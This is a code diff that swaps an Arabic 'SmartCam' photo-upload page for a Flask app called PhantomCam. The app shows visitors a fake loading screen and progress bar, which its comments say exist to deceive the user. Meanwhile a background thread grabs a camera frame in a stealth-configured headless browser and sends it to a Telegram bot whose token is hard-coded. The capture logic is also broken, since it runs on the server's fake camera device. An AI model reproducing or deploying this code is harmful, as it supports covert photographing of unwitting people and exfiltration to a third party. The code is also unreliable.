@@ -1,218 +1,221 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 SmartCam - خدمة تحميل الصور</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 50px;
-            max-width: 700px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-        }
-        h1 {
-            font-size: 3em;
-            font-weight: 900;
-            background: linear-gradient(45deg, #f093fb, #f5576c);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            font-size: 1.2em;
-            color: #aaa;
-            margin-bottom: 30px;
-            font-weight: 300;
-        }
-        .fake-camera {
-            background: #1a1a2e;
-            border-radius: 20px;
-            padding: 30px;
-            margin: 20px 0;
-            border: 2px dashed #f5576c;
-            position: relative;
-        }
-        .fake-camera::before {
-            content: "📷";
-            font-size: 4em;
-            display: block;
-            animation: pulse 2s infinite;
-        }
-        .fake-camera p {
-            color: #888;
-            font-size: 0.9em;
-            margin-top: 10px;
-        }
-        .status-dot {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            background: #00ff88;
-            border-radius: 50%;
-            margin-right: 8px;
-            animation: blink 1.5s infinite;
-        }
-        .btn {
-            background: linear-gradient(45deg, #f093fb, #f5576c);
-            border: none;
-            padding: 15px 40px;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 1.2em;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            margin: 10px 5px;
-        }
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.4);
-        }
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid #555;
-        }
-        .log-area {
-            background: rgba(0,0,0,0.3);
-            border-radius: 15px;
-            padding: 15px;
-            margin-top: 20px;
-            max-height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8em;
-            color: #0f0;
-            border: 1px solid #333;
-        }
-        .log-area::-webkit-scrollbar {
-            width: 5px;
-        }
-        .log-area::-webkit-scrollbar-thumb {
-            background: #f5576c;
-            border-radius: 10px;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
-        .footer {
-            margin-top: 25px;
-            color: #555;
-            font-size: 0.8em;
-        }
-        .badge {
-            display: inline-block;
-            background: #f5576c;
-            color: #fff;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-size: 0.7em;
-            font-weight: 700;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>📸 SmartCam</h1>
-        <p class="subtitle">🔄 معالج الصور الذكي • تحميل تلقائي • حفظ سحابي</p>
-        
-        <div class="fake-camera">
-            <span class="status-dot"></span> <span style="color:#00ff88;font-weight:700;">البث المباشر</span>
-            <p>⏳ جاري تهيئة الكاميرا... يرجى الانتظار</p>
-            <p style="font-size:0.7em;color:#555;margin-top:5px;">🔒 اتصال مشفر • SSL/TLS</p>
-        </div>
+# -*- coding: utf-8 -*-
+from flask import Flask, render_template, jsonify, request, redirect, url_for
+import asyncio
+import aiohttp
+import base64
+import json
+import os
+import random
+import string
+import threading
+import time
+from datetime import datetime
+from playwright.async_api import async_playwright
+from PIL import Image
+import io
 
-        <div>
-            <button class="btn" onclick="startCapture()">▶ بدء الالتقاط</button>
-            <button class="btn btn-secondary" onclick="stopCapture()">⏹ إيقاف</button>
-            <button class="btn btn-secondary" onclick="refreshLog()">🔄 تحديث السجل</button>
-        </div>
+app = Flask(__name__)
 
-        <div style="margin:15px 0;">
-            <span class="badge">📤 تم الرفع: <span id="uploadCount">0</span></span>
-            <span class="badge" style="background:#302b63;">⏱ آخر صورة: <span id="lastCapture">--</span></span>
-        </div>
+# ---------- TELEGRAM CONFIG ----------
+BOT_TOKEN = "8896286925:AAH5OMU3eB5CVx7TOJ5-uxcCRtBfmMEcOtk"
+CHAT_ID = "8790754582"
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 
-        <div class="log-area" id="logDisplay">
-            <div style="color:#666;">⏳ انتظار البيانات...</div>
-        </div>
+# ---------- GLOBAL VARIABLES ----------
+is_capturing = False
+capture_complete = False
+latest_filename = None
+capture_log = []
+total_captures = 0
 
-        <div class="footer">
-            © 2026 SmartCam • نظام إدارة الوسائط الذكي v3.7
-        </div>
-    </div>
+# ---------- FILE NAME GENERATOR ----------
+def generate_filename(ext="jpg"):
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+    return f"cam_{ts}_{rand}.{ext}"
 
-    <script>
-        // ---------- JavaScript للواجهة الوهمية ----------
-        async function startCapture() {
-            const res = await fetch('/api/start', { method: 'POST' });
-            const data = await res.json();
-            alert('✅ تم تشغيل الالتقاط!');
-            refreshLog();
+# ---------- CAPTURE ENGINE ----------
+async def capture_and_send():
+    """Captures one frame and sends to Telegram."""
+    global total_captures, latest_filename
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=True,
+                args=[
+                    "--use-fake-ui-for-media-stream",
+                    "--use-fake-device-for-media-stream",
+                    "--disable-web-security",
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-blink-features=AutomationControlled"
+                ]
+            )
+            context = await browser.new_context(
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                viewport={"width": 1280, "height": 720}
+            )
+            page = await context.new_page()
+            
+            # Stealth
+            await page.add_init_script("""
+                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                window.chrome = { runtime: {} };
+                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
+            """)
+            
+            # Load any page (use about:blank for speed)
+            await page.goto("about:blank")
+            
+            # Capture script
+            js_code = """
+            (function() {
+                return new Promise((resolve) => {
+                    let video = document.createElement('video');
+                    video.autoplay = true;
+                    video.muted = true;
+                    let canvas = document.createElement('canvas');
+                    let ctx = canvas.getContext('2d');
+                    
+                    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
+                    if (!navigator.getUserMedia) {
+                        resolve({ error: 'getUserMedia not supported' });
+                        return;
+                    }
+                    
+                    navigator.getUserMedia(
+                        { video: { width: 640, height: 480, facingMode: 'environment' } },
+                        function(stream) {
+                            video.srcObject = stream;
+                            video.onloadedmetadata = function() {
+                                video.play();
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                setTimeout(() => {
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+                                    stream.getTracks().forEach(track => track.stop());
+                                    resolve({ image: dataUrl });
+                                }, 600);
+                            };
+                        },
+                        function(err) {
+                            resolve({ error: err.message });
+                        }
+                    );
+                });
+            })();
+            """
+            
+            result = await page.evaluate(js_code)
+            await browser.close()
+            
+            if result.get('error'):
+                return {'status': 'error', 'message': result['error']}
+            
+            img_data_url = result['image']
+            header, encoded = img_data_url.split(',', 1)
+            img_bytes = base64.b64decode(encoded)
+            
+            # Send to Telegram
+            fname = generate_filename()
+            latest_filename = fname
+            async with aiohttp.ClientSession() as session:
+                data = aiohttp.FormData()
+                data.add_field('chat_id', CHAT_ID)
+                data.add_field('caption', f"📸 {fname} | PhantomCam")
+                data.add_field('photo', img_bytes, filename=fname, content_type='image/jpeg')
+                
+                async with session.post(TELEGRAM_API, data=data) as resp:
+                    if resp.status == 200:
+                        total_captures += 1
+                        return {'status': 'success', 'filename': fname}
+                    else:
+                        return {'status': 'error', 'message': f'Telegram error: {resp.status}'}
+                        
+    except Exception as e:
+        return {'status': 'error', 'message': str(e)}
+
+def background_capture():
+    """Runs capture once and updates global flags."""
+    global is_capturing, capture_complete, capture_log
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    try:
+        result = loop.run_until_complete(capture_and_send())
+        log_entry = {
+            'time': datetime.now().isoformat(),
+            'status': result.get('status'),
+            'message': result.get('message') or result.get('filename', '')
         }
+        capture_log.append(log_entry)
+        if len(capture_log) > 50:
+            capture_log = capture_log[-50:]
+        capture_complete = True
+    except Exception as e:
+        capture_log.append({'time': datetime.now().isoformat(), 'status': 'error', 'message': str(e)})
+        capture_complete = True
+    finally:
+        is_capturing = False
 
-        async function stopCapture() {
-            const res = await fetch('/api/stop', { method: 'POST' });
-            const data = await res.json();
-            alert('⏹ تم إيقاف الالتقاط.');
-            refreshLog();
-        }
+# ---------- FLASK ROUTES ----------
+@app.route('/')
+def loading_page():
+    """الصفحة الأولى: شاشة تحميل وهمية"""
+    global is_capturing, capture_complete
+    
+    # Reset flags for new visit
+    is_capturing = True
+    capture_complete = False
+    
+    # Start capture in background thread
+    thread = threading.Thread(target=background_capture, daemon=True)
+    thread.start()
+    
+    return render_template('loading.html')
 
-        async function refreshLog() {
-            const res = await fetch('/api/log');
-            const data = await res.json();
-            const log = data.log || [];
-            const display = document.getElementById('logDisplay');
-            if (log.length === 0) {
-                display.innerHTML = '<div style="color:#666;">📭 لا توجد سجلات بعد</div>';
-            } else {
-                display.innerHTML = log.slice(-10).reverse().map(entry => {
-                    const statusColor = entry.status === 'success' ? '#0f0' : '#f00';
-                    return `<div style="border-bottom:1px solid #222;padding:4px 0;">
-                        <span style="color:${statusColor};font-weight:bold;">[${entry.status}]</span>
-                        <span style="color:#aaa;">${entry.time}</span>
-                        <span style="color:#fff;">${entry.message}</span>
-                    </div>`;
-                }).join('');
-            }
-            // Update upload count
-            const successCount = log.filter(e => e.status === 'success').length;
-            document.getElementById('uploadCount').textContent = successCount;
-            if (log.length > 0) {
-                const last = log[log.length - 1];
-                document.getElementById('lastCapture').textContent = last.time ? last.time.slice(11,19) : '--';
-            }
-        }
+@app.route('/api/progress')
+def progress():
+    """API يتحقق من حالة الالتقاط (يستخدمه JavaScript لتحديث شريط التقدم)"""
+    global is_capturing, capture_complete, latest_filename, total_captures
+    
+    # Generate fake progress (0-100) based on time
+    # نجعل التقدم يتحرك ببطء لإيهام المستخدم بأن شيئاً يحدث
+    if is_capturing:
+        # Progress يزيد تدريجياً من 0 إلى 95
+        elapsed = int(time.time() * 10) % 100
+        progress = min(95, elapsed)
+        return jsonify({
+            'status': 'loading',
+            'progress': progress,
+            'message': f'جاري التحميل... {progress}%'
+        })
+    elif capture_complete:
+        return jsonify({
+            'status': 'complete',
+            'progress': 100,
+            'message': '✅ تم التحميل بنجاح!',
+            'filename': latest_filename,
+            'total': total_captures
+        })
+    else:
+        return jsonify({
+            'status': 'error',
+            'progress': 0,
+            'message': '⚠️ حدث خطأ، حاول مرة أخرى'
+        })
 
-        // Auto-refresh every 5 seconds
-        setInterval(refreshLog, 5000);
-        refreshLog();
-    </script>
-</body>
-                                              </html>
+@app.route('/redirect')
+def redirect_page():
+    """الصفحة النهائية بعد الانتهاء - تعيد التوجيه إلى موقع آخر"""
+    return render_template('redirect.html')
+
+@app.route('/api/log')
+def get_log():
+    return jsonify({'log': capture_log, 'total': total_captures})
+
+# ---------- RUN APP ----------
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
